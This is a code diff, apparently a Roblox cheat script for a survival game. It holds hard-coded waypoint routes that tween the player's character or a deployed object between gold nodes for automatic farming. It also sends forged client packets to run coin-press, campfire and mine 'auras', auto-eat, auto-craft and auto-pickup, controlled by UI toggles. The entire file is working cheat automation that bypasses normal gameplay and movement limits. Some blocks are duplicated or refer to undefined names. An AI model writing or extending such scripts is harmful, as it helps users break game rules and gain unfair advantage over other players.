+	CFrame.new(Vector3.new(76.44463348388672, -75.08224487304688, -133.29867553710938)),
+	CFrame.new(Vector3.new(82.40676879882812, -51.47822189331055, -54.51678466796875)),
+	CFrame.new(Vector3.new(42.019683837890625, -36.517791748046875, -43.338565826416016)),
+	CFrame.new(Vector3.new(-33.110538482666016, -35.0000114440918, -147.6772918701172)),
+	CFrame.new(Vector3.new(-7.2733049392700195, -3.0000007152557373, -273.6367492675781)),
+	-- Going to the mountain
+	CFrame.new(Vector3.new(215.0220489501953, -3.0000007152557373, -402.2403564453125)),
+	CFrame.new(Vector3.new(482.00433349609375, -7.002034664154053, -397.1016845703125)),
+	CFrame.new(Vector3.new(547.7274169921875, 10.737629890441895, -394.296875)),
+	-- 4 Gold nodes at mountain
+	CFrame.new(Vector3.new(612.3357543945312, -3.338651180267334, -387.5827331542969)),
+	CFrame.new(Vector3.new(636.9877319335938, -2.5574753284454346, -381.1177673339844)),
+	CFrame.new(Vector3.new(623.9852294921875, -4.704492092132568, -357.38800048828125)),
+	CFrame.new(Vector3.new(609.3678588867188, -4.593686103820801, -350.82940673828125)),
+	-- Going away
+	CFrame.new(Vector3.new(569.9754028320312, 10.83140754699707, -401.6435241699219)),
+	CFrame.new(Vector3.new(563.77197265625, 10.257417678833008, -383.3118896484375)),
+	CFrame.new(Vector3.new(545.0091552734375, -4.519443511962891, -356.3315124511719)),
+	CFrame.new(Vector3.new(484.437255859375, -7.081563949584961, 100.89507293701172)),
+	-- 2 Nodes at sand
+	CFrame.new(Vector3.new(465.3414611816406, 18.63529396057129, 148.40216064453125)), -- Node 1 
+	CFrame.new(Vector3.new(484.7383117675781, 14.45421028137207, 180.80996704101562)), -- Goes into the middle
+	CFrame.new(Vector3.new(466.52752685546875, 14.872398376464844, 234.58738708496094)), -- Last gold node
+	-- Going to sand main area
+	CFrame.new(Vector3.new(499.2276306152344, -3.0000007152557373, 244.4260711669922)),
+	CFrame.new(Vector3.new(963.5517578125, -7.754560947418213, 385.99285888671875)),
+	CFrame.new(Vector3.new(1072.6119384765625, -3.0793397426605225, 387.2690734863281)),
+	CFrame.new(Vector3.new(1259.4644775390625, -9.322108268737793, 376.37701416015625)),
+	CFrame.new(Vector3.new(1299.9752197265625, -27.001705169677734, 456.93572998046875)),
+	CFrame.new(Vector3.new(1218.2529296875, -22.022804260253906, 472.0537414550781)),
+	-- Nodes at sand
+	CFrame.new(Vector3.new(1162.9521484375, -14.7279052734375, 482.2242736816406)), -- Node at enterence dead ahead
+	CFrame.new(Vector3.new(1191.15771484375, -15.02241325378418, 476.37835693359375)), -- Goes into middle
+	CFrame.new(Vector3.new(1185.395263671875, -15.00036907196045, 460.208251953125)), -- Node on right
+	CFrame.new(Vector3.new(1216.8890380859375, -12.563868522644043, 528.6837768554688)), 
+	CFrame.new(Vector3.new(1244.1275634765625, -14.952160835266113, 561.5928955078125)),
+	CFrame.new(Vector3.new(1239.200439453125, -15.900298118591309, 570.3939208984375)), -- Another node
+	CFrame.new(Vector3.new(1282.5621337890625, -15.79450798034668, 620.6126708984375)),
+	CFrame.new(Vector3.new(1317.4539794921875, -15.795480728149414, 659.0906372070312)),
+	CFrame.new(Vector3.new(1280.4825439453125, -18.614084243774414, 689.0258178710938)), -- Gold node
+	CFrame.new(Vector3.new(1313.737548828125, -15.797083854675293, 664.5869140625)),
+	CFrame.new(Vector3.new(1360.52783203125, -18.541244506835938, 680.0048828125)), -- Gold node
+	-- Leaving the cave
+	CFrame.new(Vector3.new(1319.6949462890625, -15.950228691101074, 664.529541015625)),
+	CFrame.new(Vector3.new(1246.6015625, -15.611971855163574, 577.9691772460938)),
+	CFrame.new(Vector3.new(1189.4642333984375, -15.01001262664795, 478.0154724121094)),
+	CFrame.new(Vector3.new(1230.731201171875, -25.774398803710938, 466.1694641113281)),
+	CFrame.new(Vector3.new(1256.6689453125, -26.72586441040039, 460.2915344238281)),
+	CFrame.new(Vector3.new(1305.7230224609375, -27.92124366760254, 466.43951416015625)),
+	CFrame.new(Vector3.new(1290.762939453125, -10.434697151184082, 418.146240234375)),
+
+	CFrame.new(Vector3.new(1301.755859375, -3.061819314956665, 360.1845397949219)),
+	CFrame.new(Vector3.new(1298.0111083984375, -7.562569618225098, 323.5762023925781)),
+	CFrame.new(Vector3.new(1217.795166015625, -7.010993003845215, -439.6914978027344)),
+	CFrame.new(Vector3.new(976.1392211914062, -7.000000953674316, -1273.11083984375)),
+	CFrame.new(Vector3.new(957.190185546875, -3.0000007152557373, -1339.2149658203125)),
+
+	--remove
+
+
+
+}
+
+--    CFrame.new(Vector3.new(-107.30204772949219, -14.086453437805176, -187.487548828125)),
+
+local currentIndex = 1 -- Initialize the index for target positions
+local walking = false -- Track if walking is enabled
+local moving = false -- Track if the character is currently moving
+
+-- Define the walkTo function
+-- Define the walkTo function
+local function walkTo(position)
+	local character = game.Players.LocalPlayer.Character
+	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+
+	if not humanoidRootPart then
+		return
+	end
+
+	moving = true 
+
+	local distance = (position.Position - humanoidRootPart.Position).Magnitude
+	local time = distance / speed 
+
+	local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear)
+
+	local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = position})
+	tween:Play()
+
+	tween.Completed:Wait() 
+
+	moving = false
+
+	local waitTime = waitTimes[currentIndex] or 0 -- Retrieve wait time from the array
+	wait(waitTime) -- Wait for the calculated wait time
+end
+
+
+
+--auto eat
+
+local Farming = combat:AddGroupbox({Name="ENABLE THESE AT ICE"})
+
+Farming:AddToggle('MyToggle', {
+	Text = 'Humanoid GoldFarm',
+	Default = false,
+	Tooltip = 'Toggle to enable auto gold farm',
+	Callback = function(enabled)
+		walking = enabled
+		if enabled and not moving then 
+			spawn(function()
+				while walking do
+					wait()
+					pcall(function()
+						local position = targetPositions[currentIndex]
+						walkTo(position)
+						currentIndex = (currentIndex % #targetPositions) + 1
+					end)
+				end
+			end)
+		end
+	end
+})
+--autohit
+
+Farming:AddToggle('GoldFarm', {
+    Text = 'shark Gold Farm',
+    Default = false,
+    Tooltip = 'Toggle to enable auto gold farm',
+    Callback = function(enabled)
+        if enabled then
+            repeat
+			local object = workspace.Deployables["Domestic Goldy Boi"] -- Replace "Domestic Goldy Boi" with the name of your object
+--dropdown
+            local waitTimes = {
+                1.6, 1.6, 1.6, 1.6, 0, 0, 0, 0, 0, 0, 0, 0, 1.6, 0, 0, 0, 0, 1.6, 1.6, 1.6, 1.6, 0, 0, 0, 0, 0, 0, 1.6, 0, 1.6, 0, 0, 0, 0, 0, 0, 0, 0, 1.6, 0, 0, 0, 0, 0, 0, 0, 1.6, 0, 0, 0, 0, 1.6, 0, 0, 0, 0, 1.6, 1.6, 0, 0, 0, 0, 0, 1.6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1.6, 1.6, 1.6, 1.6, 0, 0, 0, 0, 1.6, 0, 1.6, 0, 0, 0, 0, 0, 0, 1.6, 0, 1.6, 0, 0, 1.6, 0, 0, 1.6, 0, 1.6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
+
+                        local targetPositions = {
+                -- Spawn at ice nodes (4)
+                -- 4 Gold Nodes
+                Vector3.new(915.2814331054688, -2.5274174213409424, -1385.6158447265625), -- 4 Gold Nodes Bottom left
+                Vector3.new(912.7943115234375, -1.6242637634277344, -1413.04833984375), -- Bottom right
+                Vector3.new(944.5631103515625, -1.5960471630096436, -1428.4208984375), -- Top Left Node
+                Vector3.new(958.9597778320312, -3.0000007152557373, -1391.968017578125), -- Top Right
+                -- Going towards 4 nodes at mountain
+                Vector3.new(893.2815551757812, -7.000373363494873, -969.5551147460938), -- Adjusted to make it more direct
+                Vector3.new(786.5398559570312, -3.0000007152557373, -718.9921875),
+                Vector3.new(641.176513671875, -3.855578899383545, -539.2426147460938),
+                Vector3.new(606.1619873046875, 32.754493713378906, -486.9465026855469),
+                Vector3.new(629.888427734375, 51.95648193359375, -433.0956115722656),
+                Vector3.new(642.2515258789062, 55.56715393066406, -418.8298645019531),
+                Vector3.new(650.3762817382812, 66.8869857788086, -409.7201843261719),
+                Vector3.new(666.4571533203125, 81.0921859741211, -393.62176513671875),
+                -- Single node on mountain
+                Vector3.new(688.4791870117188, 87.61669921875, -394.652099609375), -- Node on top of mountain
+                -- Going to the 4 nodes in the mountain
+                Vector3.new(666.319091796875, 70.99797058105469, -370.13189697265625),
+                Vector3.new(642.205810546875, 53.215579986572266, -367.0735168457031),
+                Vector3.new(606.570556640625, 28.03556251525879, -357.19976806640625),
+                Vector3.new(583.2708129882812, 14.1685791015625, -349.2284851074219),
+                -- Start of the 4 nodes at the mountain
+                Vector3.new(608.3096923828125, -5.825555324554443, -352.3447265625), -- First Node -- Bottom right
+                Vector3.new(622.8633422851562, -4.749398231506348, -357.05206298828125), -- Second node -- Top right
+                Vector3.new(638.2216796875, -1.9700599908828735, -381.2216491699219), -- Top left gold node
+                Vector3.new(613.03955078125, -3.3478689193725586, -387.1720886230469), -- Bottom left gold node -- 21
+                -- Going out of the 4 gold node mountain
+                Vector3.new(552.1689453125, 10.88880729675293, -391.5129699707031), -- outside the entrance
+                Vector3.new(510.2638854980469, -3.4913477897644043, -389.0484924316406), -- Onto the ground
+                --Heading towards the 3 gold nodes near waterfall
+                Vector3.new(206.7015380859375, -3, -392.4203796386719),
+                Vector3.new(125.72357177734375, -3, -367.7125244140625),
+                Vector3.new(11.849638938903809, -3, -273.90325927734375),
+                Vector3.new(-104.69710540771484, -3.0002832412719727, -224.1416015625),
+                -- 3 Gold Nodes near waterfall
+                Vector3.new(-127.7438735961914, -7.123413562774658, -203.4132843017578), -- Top Gold node
+                Vector3.new(-119.87413024902344, -25.971975326538086, -193.47650146484375), -- Tps down to the second highest gold node at a safe spot
+                Vector3.new(-109.06890869140625, -23.964372634887695, -187.114501953125), -- Tps to the second highest gold node to break it
+                Vector3.new(-146.6690216064453, -29.13951873779297, -166.2297821044922), -- Third gold node at the bottom -- 31
+                -- Goes down into the underground
+                Vector3.new(-78.91585540771484, -35.0000114440918, -114.45983123779297), -- Tps to the ground
+                Vector3.new(-57.03752136230469, -35.27948760986328, -104.7385025024414), -- At the entrance of the underground
+                Vector3.new(24.822755813598633, -35.0000114440918, -61.54426574707031), -- Near the turning left
+                Vector3.new(70.70474243164062, -45.68882369995117, -41.72166061401367), -- At the end wall near the turning left
+                Vector3.new(78.14912414550781, -72.6690902709961, -119.64269256591797), -- near the bottom
+                Vector3.new(76.23568725585938, -75.1935043334961, -143.13555908203125),
+                Vector3.new(26.672353744506836, -75.03893280029297, -112.16252899169922),
+                -- 1 Gold node near entrance of the cave
+                Vector3.new(6.2319817543029785, -79.60725402832031, -80.90323638916016), -- Gold node
+                -- Going to other nodes
+                Vector3.new(-3.0255465507507324, -83.4150619506836, -161.24505615234375),
+                Vector3.new(-46.13719177246094, -84.78394317626953, -210.84336853027344),
+                Vector3.new(-171.44276428222656, -87.3593978881836, -258.4068603515625),
+                Vector3.new(-230.35887145996094, -83.01371765136719, -254.90994262695312), --44
+                -- 1 Gold node near water
+                -- Going to more nodes
+                Vector3.new(-235.50645446777344, -95.69903564453125, -205.97381591796875),
+                Vector3.new(-201.13409423828125, -95.00701141357422, -100.48636627197266),
+                Vector3.new(-51.05535125732422, -95.09739685058594, -16.503742218017578),
+                -- 1 Node
+                Vector3.new(-18.18035316467285, -88.2457275390625, -4.662241458892822), -- On top of the node
+                -- Going back for more nodes
+                Vector3.new(-121.60362243652344, -95.46952819824219, -44.21466064453125),
+                Vector3.new(-226.48095703125, -95.75582122802734, -137.62271118164062), -- 50
+                Vector3.new(-311.2962341308594, -95.0000228881836, -62.702903747558594),
+                Vector3.new(-330.52532958984375, -91.57213592529297, -51.29126739501953),
+                -- 1 node
+                Vector3.new(-337.6909484863281, -87.902587890625, -44.36483383178711), -- On top of node -- 53
+                -- Going away
+                Vector3.new(-328.63311767578125, -91.01595306396484, -75.27430725097656), -- 54
+                Vector3.new(-320.9810791015625, -84.55455017089844, -112.79277038574219),
+                Vector3.new(-311.7552185058594, -80.34954071044922, -111.021240234375),
+                Vector3.new(-287.1490173339844, -71.30132293701172, -90.15459442138672),
+                -- 2 Nodes
+                Vector3.new(-242.28013610839844, -69.51567077636719, -70.7128677368164),
+                Vector3.new(-236.10598754882812, -71.55790710449219, -82.93661499023438),
+                -- Going away
+                Vector3.new(-262.2549743652344, -71.92373657226562, -78.05333709716797),
+                Vector3.new(-281.7058410644531, -95.24771881103516, -62.516048431396484),
+                Vector3.new(-204.44337463378906, -95.3782730102539, -215.5300750732422),
+                Vector3.new(-191.27264404296875, -87.3593978881836, -241.33700561523438),
+                Vector3.new(-227.31439208984375, -82.79011535644531, -262.97674560546875),
+                -- 1 Node
+                Vector3.new(-300.4206237792969, -78.71428680419922, -370.5965576171875), -- NEW ONE
+                -- Going away
+                Vector3.new(-248.25885009765625, -78.9493408203125, -325.4560241699219),
+                Vector3.new(-201.70730590820312, -71.25202941894531, -387.3911437988281),
+                Vector3.new(-192.30209350585938, -67.08699035644531, -418.3362731933594),
+                Vector3.new(-177.47344970703125, -66.61293029785156, -420.8051452636719),
+                Vector3.new(-168.78817749023438, -73.24115753173828, -420.8697204589844),
+                Vector3.new(-147.6465301513672, -103.0000228881836, -420.92999267578125),
+                Vector3.new(-126.42853546142578, -103.0000228881836, -417.2859191894531),
+                Vector3.new(15.329987525939941, -101.69576263427734, -415.40478515625),
+                Vector3.new(20.97073745727539, -98.90089416503906, -390.7903137207031),
+
+                Vector3.new(11.502516746520996, -103.0000228881836, -422.4435119628906),
+                Vector3.new(-35.83039093017578, -103.0000228881836, -400.1163024902344),
+                Vector3.new(-106.4627456665039, -103.0000228881836, -346.4954833984375),
+                Vector3.new(-109.88388061523438, -89.20711517333984, -270.5399475097656),
+                Vector3.new(-89.2496566772461, -87.23206329345703, -219.29232788085938),
+                Vector3.new(-39.856876373291016, -83.04651641845703, -209.97061157226562),
+                Vector3.new(7.984494686126709, -83.09564971923828, -155.0764617919922),
+                Vector3.new(50.02766418457031, -75.1011734008789, -141.13885498046875),
+                Vector3.new(76.44463348388672, -75.08224487304688, -133.29867553710938),
+                Vector3.new(82.40676879882812, -51.47822189331055, -54.51678466796875),
+                Vector3.new(42.019683837890625, -36.517791748046875, -43.338565826416016),
+                Vector3.new(-33.110538482666016, -35.0000114440918, -147.6772918701172),
+                Vector3.new(-7.2733049392700195, -3.0000007152557373, -273.6367492675781),
+                -- Going to the mountain
+                Vector3.new(215.0220489501953, -3.0000007152557373, -402.2403564453125),
+                Vector3.new(482.00433349609375, -7.002034664154053, -397.1016845703125),
+                Vector3.new(547.7274169921875, 10.737629890441895, -394.296875),
+                -- 4 Gold nodes at mountain
+                Vector3.new(612.3357543945312, -3.338651180267334, -387.5827331542969),
+                Vector3.new(636.9877319335938, -2.5574753284454346, -381.1177673339844),
+                Vector3.new(623.9852294921875, -4.704492092132568, -357.38800048828125),
+                Vector3.new(609.3678588867188, -4.593686103820801, -350.82940673828125),
+                -- Going away
+                Vector3.new(569.9754028320312, 10.83140754699707, -401.6435241699219),
+                Vector3.new(563.77197265625, 10.257417678833008, -383.3118896484375),
+                Vector3.new(545.0091552734375, -4.519443511962891, -356.3315124511719),
+                Vector3.new(484.437255859375, -7.081563949584961, 100.89507293701172),
+                -- 2 Nodes at sand
+                Vector3.new(465.3414611816406, 18.63529396057129, 148.40216064453125), -- Node 1 
+                Vector3.new(484.7383117675781, 14.45421028137207, 180.80996704101562), -- Goes into the middle
+                Vector3.new(466.52752685546875, 14.872398376464844, 234.58738708496094), -- Last gold node
+                -- Going to sand main area
+                Vector3.new(499.2276306152344, -3.0000007152557373, 244.4260711669922),
+                Vector3.new(963.5517578125, -7.754560947418213, 385.99285888671875),
+                Vector3.new(1072.6119384765625, -3.0793397426605225, 387.2690734863281),
+                Vector3.new(1259.4644775390625, -9.322108268737793, 376.37701416015625),
+                Vector3.new(1299.9752197265625, -27.001705169677734, 456.93572998046875),
+                Vector3.new(1218.2529296875, -22.022804260253906, 472.0537414550781),
+                -- Nodes at sand
+                Vector3.new(1162.9521484375, -14.7279052734375, 482.2242736816406), -- Node at enterence dead ahead
+                Vector3.new(1191.15771484375, -15.02241325378418, 476.37835693359375), -- Goes into middle
+                Vector3.new(1185.395263671875, -15.00036907196045, 460.208251953125), -- Node on right
+                Vector3.new(1216.8890380859375, -12.563868522644043, 528.6837768554688), 
+                Vector3.new(1244.1275634765625, -14.952160835266113, 561.5928955078125),
+                Vector3.new(1239.200439453125, -15.900298118591309, 570.3939208984375), -- Another node
+                Vector3.new(1282.5621337890625, -15.79450798034668, 620.6126708984375),
+                Vector3.new(1317.4539794921875, -15.795480728149414, 659.0906372070312),
+                Vector3.new(1280.4825439453125, -18.614084243774414, 689.0258178710938), -- Gold node
+                Vector3.new(1313.737548828125, -15.797083854675293, 664.5869140625),
+                Vector3.new(1360.52783203125, -18.541244506835938, 680.0048828125), -- Gold node
+                -- Leaving the cave
+                Vector3.new(1319.6949462890625, -15.950228691101074, 664.529541015625),
+                Vector3.new(1246.6015625, -15.611971855163574, 577.9691772460938),
+                Vector3.new(1189.4642333984375, -15.01001262664795, 478.0154724121094),
+                Vector3.new(1230.731201171875, -25.774398803710938, 466.1694641113281),
+                Vector3.new(1256.6689453125, -26.72586441040039, 460.2915344238281),
+                Vector3.new(1305.7230224609375, -27.92124366760254, 466.43951416015625),
+                Vector3.new(1290.762939453125, -10.434697151184082, 418.146240234375),
+                Vector3.new(1301.755859375, -3.061819314956665, 360.1845397949219),
+                Vector3.new(1298.0111083984375, -7.562569618225098, 323.5762023925781),
+                Vector3.new(1217.795166015625, -7.010993003845215, -439.19110107421875),
+                Vector3.new(976.1392211914062, -7.000000953674316, -1273.11083984375),
+                Vector3.new(957.190185546875, -3.0000007152557373, -1339.2149658203125)
+            }
+            local currentIndex = 1 -- Initialize the index for target positions
+			local tolerance = 2 -- Adjust this value to change how close the object needs to get to the target position
+			local speed = 55 -- Adjust this value to change the movement speed
+
+			-- Loop through each target position
+               for _, targetPosition in ipairs(targetPositions) do
+                    while true do
+                        local position = object:IsA("Model") and object.PrimaryPart and object.PrimaryPart.Position or object.Position
+                        if position then
+                            local direction = (targetPosition - position).unit
+                            local distance = (targetPosition - position).magnitude
+
+                            if distance > tolerance then
+                                -- Move the object towards the target position gradually
+                                object:SetPrimaryPartCFrame(object:GetPrimaryPartCFrame() + direction * speed * game:GetService("RunService").Heartbeat:Wait())
+                            else
+                                break -- Exit the loop when the object reaches the target position
+                            end
+                        else
+                            warn("Object does not have a valid position.")
+                            break
+                        end
+
+                        wait() -- Yield to allow other processes to run
+                    end
+
+                    local waitTime = waitTimes[currentIndex] or 0 -- Retrieve wait time from the array
+                    wait(waitTime) -- Wait for the calculated wait time
+                    currentIndex = currentIndex % #waitTimes + 1 -- Move to the next index, looping back to the beginning if necessary
+                end
+            until not Farming:GetToggleState('GoldFarm') -- Check if the toggle is still enabled
+        end
+    end,
+})
+
+
+local hipHeightSlider = Farming:AddSlider('WaitTimeSlider', {
+    Text = 'hip height adj (2) is normal',
+    Default = 0,
+    Min = 0,
+    Max = 15,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(value)
+        hipHeight = value -- Update the hip height
+        local character = game.Players.LocalPlayer.Character
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.HipHeight = value -- Adjust the character's hip height
+        end
+    end
+})
+--campfire
+local packets = require(game:GetService("ReplicatedStorage").Modules.Packets)
+local itemIDS = require(game:GetService("ReplicatedStorage").Modules.ItemIDS)
+
+local autohit = combat:AddGroupbox({Name="Auto coinpress,campfire",Side=1})
+
+
+function GetClosestPress()
+    local press, dist = nil, 26
+
+    for _, stru in next, workspace.Deployables:GetChildren() do
+        if stru.Name == "Coin Press" then
+            local dist2 = (stru:GetPivot().Position - plr.Character:GetPivot().Position).Magnitude
+
+            if dist2 < dist then
+                dist = dist2
+                press = stru
+            end
+        end
+    end
+
+    return press
+end
+
+local autopressenabled = false
+
+task.spawn(function()
+while task.wait(1/30) do
+    if not autopressenabled then
+        task.wait(1)
+        continue
+    end
+    local press = GetClosestPress()
+
+    if press ~= nil then
+        packets.InteractStructure.send({
+            ["entityID"] = press:GetAttribute("EntityID"),
+            ["itemID"] = itemIDS["Gold"]
+        })
+    end
+end
+end)
+--shark
+autohit:AddToggle('Coin press aura', {
+    Text = 'Presses coins',
+    Default = false,
+    Tooltip = 'Toggle to enable coin presser',
+    Callback = function(enabled)
+        autopressenabled = enabled
+    end
+})
+--auto pickup
+local campfireAuraEnabled = false
+local chosenItem = "Log"
+local maxCampDistance = 25
+local campAmount = 5
+local minCampHealth = 50
+
+function GetClosestCampfireWithHealth(val)
+    local campfire, dist = nil, maxCampDistance
+    local plr = game.Players.LocalPlayer
+
+    for _, stru in next, workspace.Deployables:GetChildren() do
+        if stru.Name == "Campfire" then
+            local dist2 = (stru:GetPivot().Position - plr.Character:GetPivot().Position).Magnitude
+
+            if dist2 < dist and tonumber(stru:FindFirstChild("Board"):FindFirstChild("Billboard"):FindFirstChild("Backdrop"):FindFirstChild("TextLabel").Text) <= val then
+                dist = dist2
+                campfire = stru
+            end
+        end
+    end
+
+    return campfire
+end
+
+spawn(function()
+    while task.wait() do
+        if not campfireAuraEnabled then
+            task.wait(1)
+            continue
+        end
+        local campfire = GetClosestCampfireWithHealth(minCampHealth)
+
+        if campfire then
+            for i = 1, campAmount do
+                packets.InteractStructure.send({
+                    ["entityID"] = campfire:GetAttribute("EntityID"),
+                    ["itemID"] = itemIDS[chosenItem]
+                })
+                task.wait(0.3)
+            end
+            task.wait(0.1)
+        end
+    end
+end)
+--screengui
+
+autohit:AddToggle('Campfire Aura', {
+    Text = 'fuel campfire1',
+    Default = false,
+    Tooltip = 'Toggle to make your campfires automatically fill up',
+    Callback = function(enabled)
+        campfireAuraEnabled = enabled
+    end
+})
+
+autohit:AddSlider('Campfire Health', {
+    Text = 'health for regen1',
+    Default = minCampHealth,
+    Min = 1,
+    Max = 250,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        minCampHealth = Value
+    end
+})
+
+
+--auto craft
+
+autohit:AddDropdown('Campfire Resource', {
+    Values = { 'Log', 'Leaves', 'Wood' },
+    Default = 1,
+    Multi = false,
+    Text = 'Resource1',
+    Tooltip = 'Select a resource for the campfire aura to use that :)',
+    Callback = function(Value)
+        chosenItem = Value
+    end
+})
+
+autohit:AddSlider('Campfire Distance', {
+    Text = 'distance1',
+    Default = 25,
+    Min = 0,
+    Max = 35,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        maxCampDistance = Value
+    end
+})
+
+autohit:AddSlider('Campfire Amount', {
+    Text = 'amount1',
+    Default = 5,
+    Min = 1,
+    Max = 15,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        campAmount = Value
+    end
+})
+
+
+
+
+local campfireAuraEnabled1 = false
+local chosenItem1 = "Log"
+local maxCampDistance1 = 25
+local campAmount1 = 5
+local minCampHealth1 = 50
+
+function GetClosestCampfireWithHealth(val)
+    local campfire, dist = nil, maxCampDistance1
+    local plr = game.Players.LocalPlayer
+
+    for _, stru in next, workspace.Deployables:GetChildren() do
+        if stru.Name == "Campfire" then
+            local dist2 = (stru:GetPivot().Position - plr.Character:GetPivot().Position).Magnitude
+
+            if dist2 < dist and tonumber(stru:FindFirstChild("Board"):FindFirstChild("Billboard"):FindFirstChild("Backdrop"):FindFirstChild("TextLabel").Text) <= val then
+                dist = dist2
+                campfire = stru
+            end
+        end
+    end
+
+    return campfire
+end
+
+spawn(function()
+    while task.wait() do
+        if not campfireAuraEnabled1 then
+            task.wait(1)
+            continue
+        end
+        local campfire = GetClosestCampfireWithHealth(minCampHealth1)
+
+        if campfire then
+            for i = 1, campAmount1 do
+                packets.InteractStructure.send({
+                    ["entityID"] = campfire:GetAttribute("EntityID"),
+                    ["itemID"] = itemIDS[chosenItem1]
+                })
+                task.wait(0.3)
+            end
+            task.wait(0.1)
+        end
+    end
+end)
+--ice farm
+autohit:AddLabel('_________')
+--auto grab
+autohit:AddToggle('Campfire Aura', {
+    Text = 'fuel campfire2',
+    Default = false,
+    Tooltip = 'Toggle to make your campfires automatically fill up',
+    Callback = function(enabled)
+        campfireAuraEnabled1 = enabled
+    end
+})
+
+autohit:AddSlider('Campfire Health', {
+    Text = 'Health for regen2',
+    Default = minCampHealth1,
+    Min = 1,
+    Max = 250,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        minCampHealth1 = Value
+    end
+})
+
+
+--auto craft
+
+autohit:AddDropdown('Campfire Resource', {
+    Values = { 'Log', 'Leaves', 'Wood' },
+    Default = 1,
+    Multi = false,
+    Text = 'Resource2',
+    Tooltip = 'Select a resource for the campfire aura to use that :)',
+    Callback = function(Value)
+        chosenItem1 = Value
+    end
+})
+
+autohit:AddSlider('Campfire Distance', {
+    Text = 'distance2',
+    Default = 25,
+    Min = 0,
+    Max = 35,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        maxCampDistance1 = Value
+    end
+})
+autohit:AddSlider('Campfire Amount', {
+    Text = 'amount2',
+    Default = 5,
+    Min = 1,
+    Max = 15,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        campAmount1 = Value
+    end
+})
+
+
+
+
+
+
+
+--auto eat
+
+
+
+
+
+local autohit = combat:AddGroupbox({Name="auto mine"})
+local MineAura = false
+
+--afk
+autohit:AddToggle('MyToggle', {
+    Text = 'mine aura',
+    Default = false,
+    Tooltip = 'Toggle to automatically craft items',
+    Callback = function(Value)
+        MineAura = Value
+        while MineAura do
+            if CheckPlayer() then
+                local Target = GetClosestItem()
+                local Tool = CheckTool()
+                if PlaceID == 11729688377 then
+                    if Tool then
+                        if Target then
+                            Packets.SwingTool.send({GetEntityID(Target.Parent)})
+                            local Loaded = LocalPlayer.Character.Humanoid:LoadAnimation(ReplicateAnimation)
+                            Loaded:Play()
+                        end
+                    end
+                elseif PlaceID == 11879754496 then
+                    if Tool then
+                        if Target then
+                            Packets.SwingTool.send({Target})
+                            local Loaded = LocalPlayer.Character.Humanoid:LoadAnimation(ReplicateAnimation)
+                            Loaded:Play()
+                        end
+                    end
+                end
+            end
+            task.wait(0.4)
+        end
+    end
+})
+
+
+
+
+local Farming = combat:AddGroupbox({Name="auto eat"})
+
+autoeat_enabled = Farming:AddToggle(1,{Text="Enabled"}):AddKeyPicker(1,{Default="",Text="Auto Eat",SyncToggleState=true})
+autoeat_threshold = Farming:AddSlider(1,{Text="Threshold",Default=75,Min=0,Max=101,Rounding=1})
+autoeat_foods = Farming:AddInput(1,{Text="Foods",Default="Lemon, Cooked Meat"})
+
+autoeat_enabled:OnChanged(function()
+	while true do
+		local step = rs.PreSimulation:Wait()
+		if not (isrunning and autoeat_enabled.Value) then break end
+		local hunger = (statsgui.Food.Slider.AbsoluteSize.X/statsgui.Food.AbsoluteSize.X)*100
+		if hunger<autoeat_threshold.Value then
+			for i,v in pairs(autoeat_foods.Value:split(",")) do
+				if getSlot(trim(v)) then
+					useSlot(getSlot(trim(v)))
+					break
+				end
+			end
+			task.wait(plr:GetNetworkPing()+0.4)
+		end
+	end
+end)
+
+
+
+
+
+
+--campfire
+
+
+
+--key
+local Farming = combat:AddGroupbox({Name="auto craft"})
+autocraft_count = Farming:AddSlider('DepboxSlider', { Text = 'how many', Default = 1, Min = 0, Max = 25, Rounding = 0 })
+autocraft_item = Farming:AddInput(1,{Text="Resources",Default="Leaf Shirt, Leaf Pants, Leaf Bag, Club, Light, Arrow, Bow, War Horn"})
+
+
+--autoheal
+Farming:AddToggle('MyToggle', {
+    Text = 'Auto Craft',
+    Default = false,
+    Tooltip = 'Toggle to automatically craft items',
+    Callback = function(v)
+        autocraft_enabled = v
+        if autocraft_enabled then
+            while autocraft_enabled do
+                for i = 1, autocraft_count.Value do
+                    craft(getItemId(autocraft_item.Value))
+                end
+                task.wait(0.1) -- Adjust delay as needed
+            end
+        end
+    end,
+})
+local Farming = combat:AddGroupbox({Name="Hide Items"})
+local hideitems_enabled = Farming:AddToggle(1,{Text="Enabled"}):AddKeyPicker(1,{Default="",Text="No Slide",SyncToggleState=true})
+
+local items = workspace:WaitForChild("Items")
+
+hideitems_enabled:OnChanged(function(new)
+	if new then
+		items.Parent=nil
+	else
+		items.Parent=workspace
+	end
+end)
+table.insert(unloads,function()
+	items.Parent=workspace
+end)
+
+
+
+
+--shark
+
+
+--shark
+local Farming = combat:AddGroupbox({Name="auto pickup"})
+autograb_enabled = Farming:AddToggle(1,{Text="Enabled"}):AddKeyPicker(1,{Default="",Text="Auto Pickup",SyncToggleState=true})
+autograb_range = Farming:AddSlider(1,{Text="Range",Default=25,Min=0,Max=25,Rounding=1})
+autograb_whitelistenabled = Farming:AddToggle(1,{Text="Certain Resource Enabled",Default=true})
+autograb_whitelist = Farming:AddInput(1,{Text="Resources",Default="Gold, Crystal Chunk, Void Shard, Essence, Emerald, Pink Diamond, Coin2, Coin, Magnetite, Spirit Key"})
+autograb_chest = Farming:AddToggle(1,{Text="Chest"})
+autograb_safechest = Farming:AddToggle(1,{Text="Safe Chest"})
+local autograbchest
+Farming:AddButton({Text="Bind Near Chest",Func=function()
+	local best
+	local bestdist = 25
+	for i,v in pairs(workspace.Deployables:GetChildren()) do
+		if v.Name:find("Chest") then
+			if (root.Position-v:GetPivot().Position).Magnitude<bestdist then
+				best=v.Base
+			end
+		end
+	end
+	autograbchest = best or autograbchest
+end,})
+--ice goldfarm
+local autograbwhitelist = {}
